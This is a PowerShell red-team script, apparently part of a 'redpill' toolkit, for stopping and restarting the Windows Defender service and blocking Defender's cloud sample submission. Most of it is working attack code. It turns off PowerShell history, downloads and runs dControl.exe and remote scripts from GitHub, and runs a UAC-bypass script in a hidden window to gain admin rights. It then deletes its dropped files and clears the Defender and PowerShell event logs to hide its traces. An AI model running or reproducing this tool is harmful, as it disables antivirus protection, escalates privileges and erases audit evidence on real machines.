<#
.SYNOPSIS
   Disable Windows Defender Service (WinDefend) 

   Author: @Sordum (RedTeam) | @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}, dControl.zip {auto-download}
   Optional Dependencies: UacMe.ps1 {auto-download}
   PS cmdlet Dev version: v2.3.9

.DESCRIPTION
   This CmdLet Query, Stops, Start Anti-Virus Windows Defender
   service without the need to restart or refresh target machine.

.NOTES
   This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
   If DisableDefender its executed without administrator privileges!

.Parameter Action
   Accepts arguments: Query, Stop, Start, Silence, Revert (default: Query)

.Parameter ServiceName
   The Windows Defender Service Name (default: WinDefend)

.Parameter Delay
   Time (sec) to update the service state (default: 6)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Query
   Querys the Windows Defender Service State

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Start
   Starts the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop
   Stops the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 7
   Give some time (sec) to update the service state (default: 4)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Silence
   Silence Microsoft defender from sending samples to the cloud.

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Revert
   Delete the 'Block' rules added by the 'silence' function

.INPUTS
   None. You cannot pipe objects into DisableDefender.ps1

.OUTPUTS
   Disable Windows Defender Service
   --------------------------------
   ServiceName      : WinDefend
   AMRversion       : 4.18.2104.14
   ShellPrivs       : UserLand::EOP
   StartType        : Automatic
   CurrentStatus    : Running
   CanStop          : True
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ServiceName="WinDefend",
   [string]$Action="Query",
   [int]$Delay='6'
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
## Global variable declarations { Cmdlet Internal Settings }
$Working_Directory = pwd|Select-Object -ExpandProperty Path
$Patched = (Get-MpComputerStatus -EA SilentlyContinue).AMProductVersion
If($Delay -lt 4 -or $Delay -gt 10){[int]$Delay='4'} ## min\max delay value accepted
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
If($IsClientAdmin -eq $True){$ShellPrivs = "Administrator"}Else{$ShellPrivs = "UserLand::EOP"}


If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
   Write-Host "[error] This cmdlet requires the use of -Parameters to work!" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 2;Get-Help .\DisableDefender.ps1 -Detailed
   exit ## Exit @DisableDefender
}


If($Action -ieq "Query"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query Windows Defender Service State

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Query

   .OUTPUTS
      Query Windows Defender Service
      ------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      ShellPrivs       : UserLand
      StartType        : Automatic
      CurrentStatus    : Running
      CanStop          : True
   #>


   ## Local function variable declarations
   $RawPrivs = "$ShellPrivs" -replace '::EOP',''
   $State = Get-Service -Name "$ServiceName" -EA SilentlyContinue
   $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
   $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
   $StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop

   ## Build Output Table
   Write-Host "`nQuery Windows Defender Service" -ForegroundColor Green
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
   echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
   echo "ShellPrivs       : $RawPrivs" >> $Env:TMP\qwerty.log
   echo "StartType        : $stype" >> $Env:TMP\qwerty.log
   echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
   echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
   echo "" >> $Env:TMP\qwerty.log
   Get-Content -Path "$Env:TMP\qwerty.log"

   ## Clean artifacts left behind and exit script
   Remove-Item -Path "$Env:TMP\qwerty.log" -Force
   exit ## Exit @DisableDefender

}


If($Action -ieq "Stop"){

   <#
   .SYNOPSIS
      Author: @Sordum (RedTeam) | @r00t-3xp10it
      Helper - Stops Windows Defender Service

   .NOTES
      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
      If DisableDefender its executed without administrator privileges!

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 7

   .OUTPUTS
      Disable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      ShellPrivs       : Administrator
      StartType        : Automatic
      CurrentStatus    : Stopped
      CanStop          : False
      Delete logfiles  : Powershell + Windows Defender
   #>


   ## Download ALL required files from GitHub!
   If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
         Write-Host "[error] failed to download $Env:TMP\dControl.zip" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }
   }


   If($IsClientAdmin -eq $True){## Shell running under Admin privileges

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){
         cd $Env:TMP;.\dControl.exe /D
         ## Return to @redpill working directory!
         cd $Working_Directory
      }Else{## [error] binary file not found!
         Write-Host "[error] not found: $Env:TMP\dControl.exe" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force

 
   }Else{## [error] Shell running under 'UserLand' Privileges


      ## Download required files from GitHub!
      If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
            Write-Host "[error] failed to download $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
            Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
         }
      }

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
         powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "$Env:TMP\dControl.exe /D"
      }Else{## [error] file not found!
         Write-Host "[error] not found: $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force       

   }

}


If($Action -ieq "Start"){

   <#
   .SYNOPSIS
      Author: @Sordum (RedTeam) | @r00t-3xp10it
      Helper - Starts Windows Defender Service

   .NOTES
      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin
      If DisableDefender its executed without administrator privileges!

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start -Delay 7

   .OUTPUTS
      Enable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      StartType        : UserLand::EOP
      CurrentStatus    : Running
      CanStop          : True
   #>


   ## Download required files from GitHub!
   If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/DWD/dControl.zip" -OutFile "$Env:TMP\dControl.zip" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
      If(-not(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue)){
         Write-Host "[error] failed to download $Env:TMP\dControl.zip" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }
   }


   If($IsClientAdmin -eq $True){## Shell running under Admin privileges

      ## Expand archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){
         cd $Env:TMP;.\dControl.exe /E
         ## Return to @redpill working directory!
         cd $Working_Directory
      }Else{## [error] binary file not found!
         Write-Host "[error] not found: $Env:TMP\dControl.exe" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force


   }Else{## [error] Shell running under 'UserLand' Privileges
 

      ## Download required files from GitHub!
      If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
         iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
            Write-Host "[error] failed to download $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
            Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
         }
      }

      ## Expand ZIP archive
      If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
         Expand-Archive -Path "$Env:TMP\dControl.zip" -DestinationPath "$Env:TMP" -Force
      }

      If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
         powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "$Env:TMP\dControl.exe /E"
      }Else{## [error] file not found!
         Write-Host "[error] not found: $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1;exit ## Exit @DisableDefender
      }

      Start-Sleep -Seconds $Delay
      ## Delete artifacts left behind!
      Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force

   }

}


If($Action -ieq "Silence"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Silence Microsoft Defender from sending samples to the cloud!

   .NOTES
      Administrator privileges required to add firewall rules!
   #>

   #Check for function dependencies!
   If(-not(Test-Path -Path "$Env:TMP\SilenceDefender_ATP.ps1" -EA SilentlyContinue))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1" -OutFile "$Env:TMP\SilenceDefender_ATP.ps1"|Out-Null
   }

   powershell -File $Env:TMP\SilenceDefender_ATP.ps1 -Action Silence
   Remove-Item -Path "$Env:TMP\SilenceDefender_ATP.ps1" -EA SilentlyContinue -Force

}


If($Action -ieq "Revert"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete firewall rules added by the 'silence' function!
   #>

   #Check for function dependencies!
   If(-not(Test-Path -Path "$Env:TMP\SilenceDefender_ATP.ps1" -EA SilentlyContinue))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1" -OutFile "$Env:TMP\SilenceDefender_ATP.ps1"|Out-Null
   }

   powershell -File $Env:TMP\SilenceDefender_ATP.ps1 -Action Delete -DisplayName "Silence"
   Remove-Item -Path "$Env:TMP\SilenceDefender_ATP.ps1" -EA SilentlyContinue -Force

}



<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - The Output Table for -Action '<Stop|Start>'

.NOTES
   This function also deletes all artifacts left behind
   by tihs cmdlet and logfiles if DisableDefender cmdlet
   is executed with admin privs (EOP will NOT clean logs).
#>

## Local function variable declarations
Start-Sleep -Seconds 2 ## Give time to update service state
$stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
$CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
$StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop

## Build Output Table
If($Action -ieq "Stop"){
   Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
   Write-Host "--------------------------------"
   echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
   echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
   echo "ShellPrivs       : $ShellPrivs" >> $Env:TMP\qwerty.log
   echo "StartType        : $stype" >> $Env:TMP\qwerty.log
   echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
   echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
}ElseIf($Action -ieq "Start"){
   Write-Host "`nEnable Windows Defender Service" -ForegroundColor Green
   Write-Host "-------------------------------"
   echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
   echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
   echo "ShellPrivs       : $ShellPrivs" >> $Env:TMP\qwerty.log
   echo "StartType        : $stype" >> $Env:TMP\qwerty.log
   echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
   echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
}



If($IsClientAdmin -eq $True){
   echo "Delete logfiles  : PowerShell + Windows Defender" >> $Env:TMP\qwerty.log
}
If($Action -ieq "Stop" -or $Action -ieq "Start")
{
   echo "" >> $Env:TMP\qwerty.log
   Get-Content -Path "$Env:TMP\qwerty.log"
   Remove-Item -Path "$Env:TMP\qwerty.log" -Force
}

## Clean Artifacts left behind
If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\dControl.zip" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue){
   Remove-Item -Path "$Env:TMP\dControl.ini" -EA SilentlyContinue -Force
}
If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){Start-Sleep -Seconds 3
   Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force
}


If($IsClientAdmin -eq $True){## Delete Powershell-Defender logs
   wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
   wevtutil cl "Microsoft-Windows-PowerShell/Operational"
}

exit